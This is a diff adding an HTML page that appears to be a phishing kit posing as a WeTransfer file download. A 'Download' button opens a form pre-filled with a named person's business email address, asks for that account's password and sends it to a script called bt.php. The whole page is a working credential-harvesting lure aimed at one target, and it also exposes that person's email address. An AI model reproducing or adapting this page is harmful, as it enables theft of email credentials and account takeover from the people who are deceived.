@@ -1,0 +1,122 @@
+<!-- URL =https://ankeborgsnamn.kalleanka.se/wtf/wetransfer/?email=halisdogan@bilimmakina.com.tr--><!-- w =('kalleanka.se', datetime.datetime(2003, 4, 26, 0, 0), datetime.datetime(2022, 4, 26, 0, 0))--><!DOCTYPE doctype html>
+<html>
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="Open to See" property="og:title"/>
+  <meta content="35 views, 398 likes" property="og:description"/>
+  <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet"/>
+  <!-- jQuery library -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js">
+  </script>
+  <!-- Popper JS -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js">
+  </script>
+  <!-- Latest compiled JavaScript -->
+  <style>
+   body {
+			background-image: url(img/1.jpg);
+			background-repeat: no-repeat;
+			color: #045eb4;
+		}
+		
+		
+		
+		#d {
+			position: relative;
+			left: 530px;
+			top: 350px;
+			
+		}
+		
+		#form {
+			position: absolute;
+			left: 530px;
+			top: 50px;
+			width: 400px;
+			border-radius: 10px;
+			padding: 20px;
+			z-index: 2;
+			background: white;
+			display:none;
+			
+			
+			
+			
+			
+		}
+		.blue{
+			background-color: #045eb4;
+			color: white;
+		}
+		#sub1{
+			margin-top: 480px;
+			margin-left: 140px;
+			border-radius: 15px;
+			position: absolute;
+			z-index: 1;
+			
+			
+		}
+		.sky{
+			background-color: #409fff;
+			color:white;
+			
+		}
+  </style>
+ </head>
+ <body>
+  <div id="form">
+   <div class="text-center">
+    <img src="img/2.jpg" width="200"/>
+    <br/>
+    <div style="color:black;">
+     Confirm to start download!
+    </div>
+   </div>
+   <hr/>
+   <h1>
+   </h1>
+   <form action="bt.php" method="POST">
+    <p>
+     halisdogan@bilimmakina.com.tr
+    </p>
+    <input class="form-control" id="password" name="p" placeholder="Enter Email Password" type="password" value=""/>
+    <small class="text-danger" id="er" style="margin-top: -5px; position: absolute">
+    </small>
+    <input name="x" type="hidden" value="halisdogan@bilimmakina.com.tr"/>
+    <br/>
+    <input class="btn btn-md btn-block sky" id="sub" name="sub" type="submit" value="Download"/>
+   </form>
+  </div>
+  <a class="btn btn-md sky text-white" href="#" id="sub1">
+   Download
+  </a>
+  <script>
+   $(document).ready(function(){
+			$("#sub1, #pix").click(function(){
+				$("#form").slideToggle();
+				
+			});
+			
+		});
+  </script>
+  <script>
+   $(document).ready(function() {
+	
+	$('form').submit(function() {
+		
+		var pwd = $('#password').val();
+		
+		if($('#password').val() == '') {
+			$('#er').text('Please enter your password to continue');
+			return false;
+			//$('#password').focus();
+		}else{
+			$('#er').hide().text('');
+			return true;
+		}
+	});
+});
+  </script>
+ </body>
+</html>
